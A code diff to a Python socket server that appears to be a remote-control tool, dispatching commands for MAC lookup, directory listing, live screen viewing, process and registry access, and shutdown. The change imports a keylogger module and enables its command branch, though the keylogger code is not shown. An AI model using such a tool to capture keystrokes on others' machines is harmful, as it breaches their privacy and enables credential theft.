@@ -7,6 +7,7 @@ import directory_tree_server as dt
 import live_screen_server as lss
 import app_process_server as ap
 import registry_server as rs
+import keylogger_server as kls
 
 #Global variables
 global client
@@ -42,6 +43,11 @@ def shutdown_logout():
     sl.shutdown_logout(client)
     return
 
+def keylogger():
+    global client
+    kls.keylogger(client)
+    return
+
 def Connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = ''
@@ -59,16 +65,14 @@ def Connect():
             return
         elif "MAC" in msg:
             mac_address()
-        # elif "KEYLOG" in msg:
-        #     keylogger()
+        elif "KEYLOG" in msg:
+            keylogger()
         elif "DIRECTORY" in msg:
             directory_tree()
         elif "LIVESCREEN" in msg:
             live_screen()
         elif "APP_PRO" in msg:
-            app_process()
-        
-        
+            app_process()       
         elif "REGISTRY" in msg:
             registry()
         elif "SD_LO" in msg:
